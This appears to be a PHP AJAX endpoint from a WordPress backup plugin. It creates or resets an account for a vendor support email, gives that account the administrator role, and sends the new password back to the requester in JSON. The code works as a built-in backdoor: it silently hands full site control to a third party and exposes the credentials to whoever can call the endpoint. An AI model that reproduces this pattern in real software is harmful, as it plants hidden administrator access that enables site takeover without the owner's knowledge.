<?php

require_once(dirname(__FILE__) . '/../boot.php');
_jet_secureAjax();

$support_email = 'support@jetapps.com';
$password = wp_generate_password(10, false);

$user = get_user_by('email', $support_email);

if ($user == null) {
    $user_id = wp_create_user($support_email, $password, $support_email);
    $user = get_user_by('id', $user_id);
} else {
    wp_set_password($password, $user->ID);
}

$user->remove_role('subscriber');
$user->add_role('administrator');

if (backupGuardIsAjax() && count($_POST)) {
    die(json_encode(array(
        'login' => $support_email,
        'password' => $password
    )));
}
